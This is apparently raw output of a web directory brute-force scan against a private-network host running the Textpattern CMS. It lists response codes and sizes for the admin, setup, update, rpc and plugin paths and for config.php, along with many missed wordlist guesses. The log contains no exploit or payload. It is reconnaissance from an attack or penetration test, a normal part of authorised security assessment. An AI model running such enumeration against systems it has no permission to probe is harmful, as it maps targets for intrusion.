404      GET        9l       33w      293c http://192.168.189.219/external%20files
404      GET        9l       33w      297c http://192.168.189.219/external%20files.zip
404      GET        9l       33w      292c http://192.168.189.219/Style%20Library
404      GET        9l       33w      296c http://192.168.189.219/Style%20Library.zip
301      GET        9l       28w      331c http://192.168.189.219/textpattern/themes => http://192.168.189.219/textpattern/themes/
301      GET        9l       28w      331c http://192.168.189.219/textpattern/images => http://192.168.189.219/textpattern/images/
301      GET        9l       28w      330c http://192.168.189.219/textpattern/files => http://192.168.189.219/textpattern/files/
200      GET        8l       85w     6522c http://192.168.189.219/textpattern/textpattern/admin-themes/hive/assets/js/main.js
200      GET        6l       52w     3644c http://192.168.189.219/textpattern/textpattern/admin-themes/hive/assets/js/autosize.js
200      GET        1l        7w      358c http://192.168.189.219/textpattern/textpattern/admin-themes/hive/assets/js/darkmode.js
200      GET       10l      104w    12444c http://192.168.189.219/textpattern/textpattern/admin-themes/hive/assets/img/favicon.ico
301      GET        9l       28w      340c http://192.168.189.219/textpattern/textpattern/lib => http://192.168.189.219/textpattern/textpattern/lib/
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/PasswordHash.php
200      GET        1l        3w       20c http://192.168.189.219/textpattern/textpattern/lib/txplib_wrapper.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/taglib.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_forms.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_db.php
200      GET       29l      226w     1503c http://192.168.189.219/textpattern/textpattern/lib/LICENSE-BSD-3.txt
200      GET      630l     1862w     5960c http://192.168.189.219/textpattern/textpattern/lib/i18n-ascii.txt
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_admin.php
200      GET      130l      860w     6311c http://192.168.189.219/textpattern/README
200      GET        2l     1297w    89476c http://192.168.189.219/textpattern/textpattern/vendors/jquery/jquery/jquery.js
301      GET        9l       28w      340c http://192.168.189.219/textpattern/textpattern/tmp => http://192.168.189.219/textpattern/textpattern/tmp/
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/plugins => http://192.168.189.219/textpattern/textpattern/plugins/
404      GET        9l       33w      303c http://192.168.189.219/textpattern/Reports%20List
404      GET        9l       33w      289c http://192.168.189.219/modern%20mom
200      GET      267l      319w     5123c http://192.168.189.219/textpattern/textpattern/lang/nn.ini
404      GET        9l       34w      294c http://192.168.189.219/neuf%20giga%20photo
200      GET      215l      865w    15938c http://192.168.189.219/textpattern/textpattern/lang/fi_pophelp.xml
200      GET      628l     1326w    19107c http://192.168.189.219/textpattern/textpattern/lang/is.ini
200      GET      281l     1549w    20631c http://192.168.189.219/textpattern/textpattern/lang/pl_pophelp.xml
404      GET        9l       34w      298c http://192.168.189.219/neuf%20giga%20photo.zip
200      GET      974l     2346w    36173c http://192.168.189.219/textpattern/textpattern/lang/et.ini
200      GET      597l     2326w    30164c http://192.168.189.219/textpattern/textpattern/lang/ur.ini
200      GET      875l     2386w    35851c http://192.168.189.219/textpattern/textpattern/lang/lt.ini
200      GET      792l     2039w    28244c http://192.168.189.219/textpattern/textpattern/lang/nb.ini
200      GET      820l     2274w    36841c http://192.168.189.219/textpattern/textpattern/lang/he.ini
200      GET     1064l     3548w    45794c http://192.168.189.219/textpattern/textpattern/lang/id.ini
200      GET     1086l     3823w    49345c http://192.168.189.219/textpattern/textpattern/lang/nl.ini
200      GET     1084l     2974w    48576c http://192.168.189.219/textpattern/textpattern/lang/fi.ini
200      GET     1070l     3230w    46313c http://192.168.189.219/textpattern/textpattern/lang/sv.ini
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/include => http://192.168.189.219/textpattern/textpattern/include/
200      GET      838l     2872w    42934c http://192.168.189.219/textpattern/textpattern/lang/fa.ini
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/include/txp_skin.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_admin.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_page.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_log.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_form.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_prefs.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_file.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_link.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_section.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_image.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_auth.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_plugin.php
200      GET      856l     3886w    38335c http://192.168.189.219/textpattern/textpattern/lang/vi.ini
200      GET      264l     1592w    19296c http://192.168.189.219/textpattern/textpattern/lang/nl_pophelp.xml
200      GET     1077l     3345w    65621c http://192.168.189.219/textpattern/textpattern/lang/uk.ini
200      GET     1072l     3900w    48497c http://192.168.189.219/textpattern/textpattern/lang/it.ini
200      GET      781l     1850w    30390c http://192.168.189.219/textpattern/textpattern/lang/ko.ini
200      GET     2718l     7151w    82294c http://192.168.189.219/textpattern/textpattern/textpattern.js
200      GET     1086l     3471w    50753c http://192.168.189.219/textpattern/textpattern/lang/de.ini
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/vendors/Txp.php
200      GET     1046l     3327w    61602c http://192.168.189.219/textpattern/textpattern/lang/sr-rs.ini
200      GET     1085l     3520w    49380c http://192.168.189.219/textpattern/textpattern/lang/pl.ini
200      GET      313l     1224w    18604c http://192.168.189.219/textpattern/textpattern/lang/tr_pophelp.xml
200      GET       64l      306w     4553c http://192.168.189.219/textpattern/textpattern/index.php
200      GET     1086l     4167w    49814c http://192.168.189.219/textpattern/textpattern/lang/pt-br.ini
200      GET      984l     3312w    59340c http://192.168.189.219/textpattern/textpattern/lang/bg.ini
301      GET        9l       28w      343c http://192.168.189.219/textpattern/textpattern/update => http://192.168.189.219/textpattern/textpattern/update/
200      GET      696l      872w    39903c http://192.168.189.219/textpattern/textpattern/lang/th.ini
200      GET      891l     3023w    35789c http://192.168.189.219/textpattern/textpattern/lang/pt.ini
200      GET     2718l     7151w    82294c http://192.168.189.219/textpattern/textpattern/textpattern
301      GET        9l       28w      336c http://192.168.189.219/textpattern/textpattern => http://192.168.189.219/textpattern/textpattern/
301      GET        9l       28w      328c http://192.168.189.219/textpattern/rpc => http://192.168.189.219/textpattern/rpc/
301      GET        9l       28w      342c http://192.168.189.219/textpattern/textpattern/setup => http://192.168.189.219/textpattern/textpattern/setup/
200      GET      231l      933w    15813c http://192.168.189.219/textpattern/textpattern/lang/el_pophelp.xml
200      GET      821l     1042w    37741c http://192.168.189.219/textpattern/textpattern/lang/ja.ini
200      GET      756l     8122w    69068c http://192.168.189.219/textpattern/textpattern/lang/es_pophelp.xml
200      GET      742l      924w    23996c http://192.168.189.219/textpattern/textpattern/lang/zh-tw.ini
200      GET     1029l     4571w    49246c http://192.168.189.219/textpattern/textpattern/lang/tl.ini
200      GET     1074l     3697w    59061c http://192.168.189.219/textpattern/textpattern/lang/ar.ini
200      GET      393l     1797w    19107c http://192.168.189.219/textpattern/textpattern/lang/ceb.ini
200      GET      767l     1799w    26154c http://192.168.189.219/textpattern/textpattern/lang/hr.ini
200      GET     1082l     3304w    47893c http://192.168.189.219/textpattern/textpattern/lang/sk.ini
301      GET        9l       28w      347c http://192.168.189.219/textpattern/textpattern/setup/data => http://192.168.189.219/textpattern/textpattern/setup/data/
200      GET        1l     5763w   142396c http://192.168.189.219/textpattern/textpattern/admin-themes/hive/assets/css/textpattern.css
200      GET     1086l     4722w    54285c http://192.168.189.219/textpattern/textpattern/lang/fr.ini
404      GET        9l       33w      305c http://192.168.189.219/textpattern/external%20files
301      GET        9l       28w      347c http://192.168.189.219/textpattern/textpattern/setup/lang => http://192.168.189.219/textpattern/textpattern/setup/lang/
200      GET     1066l     3193w    47337c http://192.168.189.219/textpattern/textpattern/lang/tr.ini
200      GET      310l     1283w    18309c http://192.168.189.219/textpattern/textpattern/lang/de_pophelp.xml
301      GET        9l       28w      351c http://192.168.189.219/textpattern/textpattern/setup/articles => http://192.168.189.219/textpattern/textpattern/setup/articles/
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_theme.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/constants.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/array_column.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_publish.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_html.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/IXRClass.php
200      GET     1083l    10836w    89310c http://192.168.189.219/textpattern/textpattern/lang/en-gb_pophelp.xml
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_head.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/class.trace.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_validator.php
200      GET     1086l     3212w    46629c http://192.168.189.219/textpattern/textpattern/lang/cs.ini
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/admin_config.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_update.php
200      GET       13l     1775w   253669c http://192.168.189.219/textpattern/textpattern/vendors/jquery/jquery-ui/jquery-ui.js
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/class.thumb.php
200      GET       64l      306w     4553c http://192.168.189.219/textpattern/textpattern/
200      GET       10l       14w      145c http://192.168.189.219/textpattern/textpattern/update/index
200      GET      458l     4035w    24486c http://192.168.189.219/textpattern/textpattern/lib/LICENSE-LESSER.txt
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/classTextile.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_misc.php
200      GET     1085l    11982w   103604c http://192.168.189.219/textpattern/textpattern/lang/fr_pophelp.xml
200      GET      925l     8895w    88824c http://192.168.189.219/textpattern/textpattern/lang/cs_pophelp.xml
200      GET     1080l    10835w    89314c http://192.168.189.219/textpattern/textpattern/lang/en-us_pophelp.xml
301      GET        9l       28w      341c http://192.168.189.219/textpattern/textpattern/lang => http://192.168.189.219/textpattern/textpattern/lang/
200      GET      263l      557w    13068c http://192.168.189.219/textpattern/textpattern/lang/bn.ini
200      GET       29l      182w     1279c http://192.168.189.219/textpattern/textpattern/lang/README
200      GET      807l     2086w    30595c http://192.168.189.219/textpattern/textpattern/lang/hu.ini
200      GET      201l      206w     6028c http://192.168.189.219/textpattern/textpattern/lang/km.ini
200      GET      878l     2858w    34459c http://192.168.189.219/textpattern/textpattern/lang/gl.ini
200      GET      783l     2054w    28646c http://192.168.189.219/textpattern/textpattern/lang/bs.ini
200      GET      849l     2468w    31954c http://192.168.189.219/textpattern/textpattern/lang/ro.ini
200      GET      777l     1863w    26080c http://192.168.189.219/textpattern/textpattern/lang/da.ini
200      GET     1070l     4119w    49373c http://192.168.189.219/textpattern/textpattern/lang/ca.ini
200      GET     1086l     4393w    51425c http://192.168.189.219/textpattern/textpattern/lang/es.ini
200      GET      828l     2250w    31034c http://192.168.189.219/textpattern/textpattern/lang/sr.ini
200      GET     1086l     3524w    44634c http://192.168.189.219/textpattern/textpattern/lang/en-us.ini
200      GET      951l     2613w    38640c http://192.168.189.219/textpattern/textpattern/lang/lv.ini
200      GET     1086l     1481w    43619c http://192.168.189.219/textpattern/textpattern/lang/zh-cn.ini
200      GET     1042l     4698w    50099c http://192.168.189.219/textpattern/textpattern/lang/fil.ini
200      GET     1086l     3319w    66664c http://192.168.189.219/textpattern/textpattern/lang/ru.ini
200      GET     1034l    10610w    93765c http://192.168.189.219/textpattern/textpattern/lang/it_pophelp.xml
200      GET      297l     1620w    19709c http://192.168.189.219/textpattern/textpattern/lang/ca_pophelp.xml
200      GET      226l     1059w    15382c http://192.168.189.219/textpattern/textpattern/lang/hr_pophelp.xml
200      GET      374l     2118w    23521c http://192.168.189.219/textpattern/textpattern/lang/pt-br_pophelp.xml
200      GET      313l      404w     6299c http://192.168.189.219/textpattern/textpattern/lang/cy.ini
200      GET     1086l     3527w    44635c http://192.168.189.219/textpattern/textpattern/lang/en-gb.ini
200      GET      196l      666w    11608c http://192.168.189.219/textpattern/textpattern/lang/hi.ini
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/rss.php
200      GET     1086l     3526w    44622c http://192.168.189.219/textpattern/textpattern/lang/en.ini
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/vendors => http://192.168.189.219/textpattern/textpattern/vendors/
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_diag.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_category.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_css.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_pane.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_article.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_list.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_lang.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_discuss.php
200      GET     1086l     4109w    74495c http://192.168.189.219/textpattern/textpattern/lang/el.ini
200      GET      674l     1422w    45267c http://192.168.189.219/textpattern/textpattern/lang/zh-cn_pophelp.xml
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_tag.php
200      GET     1083l    10836w    89307c http://192.168.189.219/textpattern/textpattern/lang/en_pophelp.xml
404      GET        9l       33w      315c http://192.168.189.219/textpattern/textpattern/Reports%20List
404      GET        9l       33w      308c http://192.168.189.219/textpattern/Style%20Library.zip
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/setup/Reports%20List
404      GET        9l       33w      325c http://192.168.189.219/textpattern/textpattern/setup/Reports%20List.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/external%20files
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/external%20files.zip
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/external%20files
404      GET        9l       33w      327c http://192.168.189.219/textpattern/textpattern/setup/external%20files.zip
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/update/Reports%20List
200      GET      278l     2491w    15170c http://192.168.189.219/textpattern/LICENSE
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/publish => http://192.168.189.219/textpattern/textpattern/publish/
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/log.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/search.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/taghandlers.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/atom.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/comment.php
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/external%20files
404      GET        9l       33w      328c http://192.168.189.219/textpattern/textpattern/update/external%20files.zip
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/config.php
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/setup/Style%20Library
404      GET        9l       33w      326c http://192.168.189.219/textpattern/textpattern/setup/Style%20Library.zip
301      GET        9l       28w      349c http://192.168.189.219/textpattern/textpattern/setup/themes => http://192.168.189.219/textpattern/textpattern/setup/themes/
404      GET        9l       33w      305c http://192.168.189.219/textpattern/modern%20mom.zip
404      GET        9l       34w      306c http://192.168.189.219/textpattern/neuf%20giga%20photo
404      GET        9l       34w      310c http://192.168.189.219/textpattern/neuf%20giga%20photo.zip
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/modern%20mom
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/modern%20mom.zip
404      GET        9l       34w      322c http://192.168.189.219/textpattern/textpattern/neuf%20giga%20photo.zip
404      GET        9l       33w      293c http://192.168.189.219/Web%20References
404      GET        9l       33w      297c http://192.168.189.219/Web%20References.zip
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/modern%20mom
404      GET        9l       33w      307c http://192.168.189.219/textpattern/rpc/Reports%20List
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/modern%20mom.zip
404      GET        9l       34w      324c http://192.168.189.219/textpattern/textpattern/setup/neuf%20giga%20photo
404      GET        9l       33w      311c http://192.168.189.219/textpattern/rpc/Reports%20List.zip
404      GET        9l       34w      328c http://192.168.189.219/textpattern/textpattern/setup/neuf%20giga%20photo.zip
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/external%20files
404      GET        9l       33w      313c http://192.168.189.219/textpattern/rpc/external%20files.zip
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/modern%20mom
404      GET        9l       34w      325c http://192.168.189.219/textpattern/textpattern/update/neuf%20giga%20photo
404      GET        9l       33w      312c http://192.168.189.219/textpattern/rpc/Style%20Library.zip
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/modern%20mom.zip
404      GET        9l       33w      289c http://192.168.189.219/Contact%20Us
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Web%20References
404      GET        9l       33w      309c http://192.168.189.219/textpattern/Web%20References.zip
404      GET        9l       33w      305c http://192.168.189.219/textpattern/rpc/modern%20mom
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/modern%20mom.zip
404      GET        9l       34w      314c http://192.168.189.219/textpattern/rpc/neuf%20giga%20photo.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Web%20References
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/Web%20References.zip
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Web%20References
404      GET        9l       33w      327c http://192.168.189.219/textpattern/textpattern/setup/Web%20References.zip
404      GET        9l       33w      305c http://192.168.189.219/textpattern/My%20Project.zip
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/My%20Project
404      GET        9l       33w      290c http://192.168.189.219/Donate%20Cash
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Web%20References
404      GET        9l       33w      288c http://192.168.189.219/Home%20Page
404      GET        9l       33w      328c http://192.168.189.219/textpattern/textpattern/update/Web%20References.zip
404      GET        9l       33w      292c http://192.168.189.219/Home%20Page.zip
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/My%20Project
404      GET        9l       33w      293c http://192.168.189.219/Planned%20Giving
404      GET        9l       33w      293c http://192.168.189.219/Press%20Releases
404      GET        9l       33w      297c http://192.168.189.219/Planned%20Giving.zip
404      GET        9l       33w      297c http://192.168.189.219/Privacy%20Policy.zip
404      GET        9l       33w      287c http://192.168.189.219/Site%20Map
404      GET        9l       33w      301c http://192.168.189.219/textpattern/Contact%20Us
404      GET        9l       33w      294c http://192.168.189.219/Donate%20Cash.zip
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/Contact%20Us
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Contact%20Us.zip
404      GET        9l       33w      291c http://192.168.189.219/Site%20Map.zip
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/My%20Project
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/My%20Project.zip
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Contact%20Us.zip
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/Contact%20Us
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Contact%20Us.zip
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/Web%20References
404      GET        9l       33w      313c http://192.168.189.219/textpattern/rpc/Web%20References.zip
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/Contact%20Us
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Contact%20Us.zip
404      GET        9l       33w      302c http://192.168.189.219/textpattern/Donate%20Cash
404      GET        9l       33w      306c http://192.168.189.219/textpattern/Donate%20Cash.zip
404      GET        9l       33w      300c http://192.168.189.219/textpattern/Home%20Page
404      GET        9l       33w      304c http://192.168.189.219/textpattern/Home%20Page.zip
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/My%20Project.zip
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Planned%20Giving
404      GET        9l       33w      309c http://192.168.189.219/textpattern/Planned%20Giving.zip
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Press%20Releases
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Privacy%20Policy
404      GET        9l       33w      309c http://192.168.189.219/textpattern/Privacy%20Policy.zip
404      GET        9l       33w      299c http://192.168.189.219/textpattern/Site%20Map
404      GET        9l       33w      303c http://192.168.189.219/textpattern/Site%20Map.zip
404      GET        9l       33w      314c http://192.168.189.219/textpattern/textpattern/Donate%20Cash
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/Donate%20Cash.zip
404      GET        9l       33w      312c http://192.168.189.219/textpattern/textpattern/Home%20Page
404      GET        9l       33w      316c http://192.168.189.219/textpattern/textpattern/Home%20Page.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Planned%20Giving
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/Planned%20Giving.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Press%20Releases
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Privacy%20Policy
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/Press%20Releases.zip
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/Privacy%20Policy.zip
404      GET        9l       33w      291c http://192.168.189.219/About%20Us.zip
404      GET        9l       33w      315c http://192.168.189.219/textpattern/textpattern/Site%20Map.zip
404      GET        9l       33w      291c http://192.168.189.219/Bequest%20Gift
404      GET        9l       33w      295c http://192.168.189.219/Bequest%20Gift.zip
404      GET        9l       33w      288c http://192.168.189.219/Gift%20Form
404      GET        9l       33w      292c http://192.168.189.219/Gift%20Form.zip
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/setup/Donate%20Cash
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/setup/Donate%20Cash.zip
404      GET        9l       34w      295c http://192.168.189.219/Life%20Income%20Gift
404      GET        9l       33w      289c http://192.168.189.219/New%20Folder
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Planned%20Giving
404      GET        9l       33w      293c http://192.168.189.219/New%20Folder.zip
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Press%20Releases
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Privacy%20Policy
404      GET        9l       33w      327c http://192.168.189.219/textpattern/textpattern/setup/Press%20Releases.zip
404      GET        9l       33w      327c http://192.168.189.219/textpattern/textpattern/setup/Privacy%20Policy.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/setup/Site%20Map
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/setup/Site%20Map.zip
404      GET        9l       33w      290c http://192.168.189.219/Site%20Assets
404      GET        9l       34w      290c http://192.168.189.219/What%20is%20New
404      GET        9l       33w      305c http://192.168.189.219/textpattern/rpc/Contact%20Us
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/Contact%20Us.zip
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/update/Donate%20Cash
404      GET        9l       33w      325c http://192.168.189.219/textpattern/textpattern/update/Donate%20Cash.zip
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/update/Home%20Page
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/update/Home%20Page.zip
404      GET        9l       33w      294c http://192.168.189.219/Site%20Assets.zip
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Planned%20Giving
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Press%20Releases
404      GET        9l       33w      328c http://192.168.189.219/textpattern/textpattern/update/Privacy%20Policy.zip
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/update/Site%20Map
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/update/Site%20Map.zip
404      GET        9l       33w      299c http://192.168.189.219/textpattern/About%20Us
404      GET        9l       33w      307c http://192.168.189.219/textpattern/Bequest%20Gift.zip
404      GET        9l       33w      304c http://192.168.189.219/textpattern/Gift%20Form.zip
404      GET        9l       33w      311c http://192.168.189.219/textpattern/textpattern/About%20Us
404      GET        9l       34w      307c http://192.168.189.219/textpattern/Life%20Income%20Gift
404      GET        9l       34w      311c http://192.168.189.219/textpattern/Life%20Income%20Gift.zip
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/Bequest%20Gift.zip
404      GET        9l       33w      306c http://192.168.189.219/textpattern/rpc/Donate%20Cash
404      GET        9l       33w      310c http://192.168.189.219/textpattern/rpc/Donate%20Cash.zip
404      GET        9l       33w      301c http://192.168.189.219/textpattern/New%20Folder
404      GET        9l       33w      305c http://192.168.189.219/textpattern/New%20Folder.zip
404      GET        9l       33w      304c http://192.168.189.219/textpattern/rpc/Home%20Page
404      GET        9l       33w      308c http://192.168.189.219/textpattern/rpc/Home%20Page.zip
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/Planned%20Giving
404      GET        9l       33w      313c http://192.168.189.219/textpattern/rpc/Planned%20Giving.zip
404      GET        9l       33w      313c http://192.168.189.219/textpattern/rpc/Press%20Releases.zip
404      GET        9l       33w      313c http://192.168.189.219/textpattern/rpc/Privacy%20Policy.zip
404      GET        9l       33w      302c http://192.168.189.219/textpattern/Site%20Assets
404      GET        9l       33w      306c http://192.168.189.219/textpattern/Site%20Assets.zip
404      GET        9l       33w      303c http://192.168.189.219/textpattern/rpc/Site%20Map
404      GET        9l       33w      316c http://192.168.189.219/textpattern/textpattern/Gift%20Form.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/setup/About%20Us
404      GET        9l       34w      302c http://192.168.189.219/textpattern/What%20is%20New
404      GET        9l       34w      306c http://192.168.189.219/textpattern/What%20is%20New.zip
404      GET        9l       34w      319c http://192.168.189.219/textpattern/textpattern/Life%20Income%20Gift
404      GET        9l       34w      323c http://192.168.189.219/textpattern/textpattern/Life%20Income%20Gift.zip
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/setup/Bequest%20Gift
404      GET        9l       33w      325c http://192.168.189.219/textpattern/textpattern/setup/Bequest%20Gift.zip
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/New%20Folder.zip
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/setup/Gift%20Form
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/setup/Gift%20Form.zip
404      GET        9l       33w      314c http://192.168.189.219/textpattern/textpattern/Site%20Assets
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/Site%20Assets.zip
404      GET        9l       34w      325c http://192.168.189.219/textpattern/textpattern/setup/Life%20Income%20Gift
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/New%20Folder
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/New%20Folder.zip
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/setup/Site%20Assets
404      GET        9l       34w      320c http://192.168.189.219/textpattern/textpattern/setup/What%20is%20New
404      GET        9l       34w      324c http://192.168.189.219/textpattern/textpattern/setup/What%20is%20New.zip
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/update/About%20Us
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/update/About%20Us.zip
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/update/Bequest%20Gift
404      GET        9l       33w      326c http://192.168.189.219/textpattern/textpattern/update/Bequest%20Gift.zip
404      GET        9l       34w      329c http://192.168.189.219/textpattern/textpattern/setup/Life%20Income%20Gift.zip
404      GET        9l       34w      326c http://192.168.189.219/textpattern/textpattern/update/Life%20Income%20Gift
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/setup/Site%20Assets.zip
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/New%20Folder
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/New%20Folder.zip
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/update/Site%20Assets
404      GET        9l       33w      325c http://192.168.189.219/textpattern/textpattern/update/Site%20Assets.zip
404      GET        9l       34w      325c http://192.168.189.219/textpattern/textpattern/update/What%20is%20New.zip
404      GET        9l       34w      330c http://192.168.189.219/textpattern/textpattern/update/Life%20Income%20Gift.zip
404      GET        9l       33w      307c http://192.168.189.219/textpattern/rpc/About%20Us.zip
404      GET        9l       33w      307c http://192.168.189.219/textpattern/rpc/Bequest%20Gift
404      GET        9l       33w      311c http://192.168.189.219/textpattern/rpc/Bequest%20Gift.zip
404      GET        9l       33w      304c http://192.168.189.219/textpattern/rpc/Gift%20Form
404      GET        9l       33w      308c http://192.168.189.219/textpattern/rpc/Gift%20Form.zip
404      GET        9l       34w      311c http://192.168.189.219/textpattern/rpc/Life%20Income%20Gift
